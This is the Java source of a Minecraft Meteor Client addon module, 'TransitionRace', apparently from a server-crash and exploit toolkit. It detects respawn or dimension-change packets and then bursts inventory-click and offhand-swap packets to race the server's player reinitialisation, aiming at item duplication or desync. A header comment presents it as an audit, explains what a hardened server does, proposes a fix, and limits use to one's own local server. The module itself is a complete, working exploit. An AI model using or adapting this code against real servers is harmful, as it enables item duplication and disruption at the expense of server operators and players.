package com.example.addon.modules.crash;

import com.example.addon.AddonTemplate;
import it.unimi.dsi.fastutil.ints.Int2ObjectOpenHashMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.packets.PacketEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.*;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.network.packet.c2s.play.PlayerActionC2SPacket;
import net.minecraft.network.packet.s2c.play.PlayerRespawnS2CPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.screen.sync.ItemStackHash;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;

/**
 * AUDIT: Transition-Window Race
 *
 * The most overlooked surface (review criterion 2): for a brief window during a
 * respawn or dimension change, the server is mid-reinitialising the player —
 * entity recreated in the destination world, inventory reattached, position
 * placed — and validation that is normally airtight can be momentarily absent
 * or operating on half-built state. This module watches for the respawn /
 * dimension-change packet (PlayerRespawnS2CPacket) and, for the next N ticks,
 * replays a burst of inventory-mutation and interaction packets INTO that
 * window — racing the reinitialisation.
 *
 * If inventory clicks committed during the handoff land against the old world's
 * container view or a half-attached inventory, items can be moved/duplicated or
 * the player desynced across the two worlds.
 *
 * What a vulnerable server does: processes inventory/interaction packets that
 * arrive during the transition against stale or partially-initialised state.
 * What a hardened server does: queues or rejects gameplay packets until the
 * destination-world player is fully constructed and acknowledged.
 * Fix: mark the player "in transition" across the whole reinit and reject (or
 * buffer) inventory/interaction packets until the post-transition position is
 * confirmed by the client's TeleportConfirm.
 *
 * Trigger a transition naturally (portal, /kill + respawn, dimension command)
 * with this active. Run against your OWN local server only.
 */
public class TransitionRace extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> windowTicks = sgGeneral.add(new IntSetting.Builder()
        .name("window-ticks").description("Ticks after a transition to keep racing the reinit.")
        .defaultValue(10).range(1, 100).sliderRange(1, 40).build()
    );
    private final Setting<Integer> burst = sgGeneral.add(new IntSetting.Builder()
        .name("burst").description("Inventory/interaction packets per tick during the window.")
        .defaultValue(20).range(1, 500).sliderRange(1, 100).build()
    );
    private final Setting<Boolean> clicks = sgGeneral.add(new BoolSetting.Builder()
        .name("inventory-clicks").description("Fire QUICK_MOVE clicks across the player inventory during the window.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> offhand = sgGeneral.add(new BoolSetting.Builder()
        .name("offhand-swaps").description("Fire offhand-swap packets during the window.")
        .defaultValue(true).build()
    );

    private final GracefulResponse gr = new GracefulResponse(sgGeneral);

    private final Setting<Boolean> autoDisable = sgGeneral.add(new BoolSetting.Builder()
        .name("auto-disable").description("Disable when kicked from the server.")
        .defaultValue(true).build()
    );
    private final Setting<Boolean> showStats = sgGeneral.add(new BoolSetting.Builder()
        .name("show-stats").description("Print tick + packet count on deactivate.")
        .defaultValue(true).build()
    );

    private int ticksActive = 0, packetsSent = 0;
    private int windowRemaining = 0;
    private int transitions = 0;

    public TransitionRace() {
        super(AddonTemplate.CRASH_CATEGORY, "transition-race",
            "Replays inventory/interaction packets during the respawn/dimension-change window. Tests transition-state validation.");
    }

    @Override
    public void onActivate() {
        ticksActive = 0; packetsSent = 0; windowRemaining = 0; transitions = 0;
        gr.onActivate();
        info("Armed. Trigger a respawn or dimension change (portal, /kill, dimension command).");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        if (mc.player == null) return;
        ticksActive++;
        gr.tick();
        if (windowRemaining <= 0) return;
        windowRemaining--;

        var handler = mc.player.playerScreenHandler;
        int syncId = handler.syncId;
        int rev = handler.getRevision();
        int slots = handler.slots.size();

        for (int i = 0; i < burst.get(); i++) {
            if (clicks.get()) {
                mc.player.networkHandler.sendPacket(new ClickSlotC2SPacket(
                    syncId, rev, (short) (i % slots), (byte) 0, SlotActionType.QUICK_MOVE,
                    new Int2ObjectOpenHashMap<>(), ItemStackHash.EMPTY));
                packetsSent++;
            }
            if (offhand.get()) {
                mc.player.networkHandler.sendPacket(new PlayerActionC2SPacket(
                    PlayerActionC2SPacket.Action.SWAP_ITEM_WITH_OFFHAND, BlockPos.ORIGIN, Direction.DOWN));
                packetsSent++;
            }
        }
        gr.markFired();
    }

    @EventHandler
    private void onReceivePacket(PacketEvent.Receive event) {
        gr.onReceive(event.packet);
        if (event.packet instanceof PlayerRespawnS2CPacket) {
            windowRemaining = windowTicks.get();
            transitions++;
            info("Transition #%d detected — racing the reinit for %d ticks.", transitions, windowTicks.get());
        }
    }

    @Override
    public void onDeactivate() {
        if (showStats.get()) {
            info("Summary: %d ticks active, %d packets sent, %d transitions raced.", ticksActive, packetsSent, transitions);
            gr.report(l -> info("%s", l));
        }
    }

    @EventHandler
    private void onGameLeft(GameLeftEvent event) {
        gr.onKick();
        if (autoDisable.get() && isActive()) toggle();
    }
}
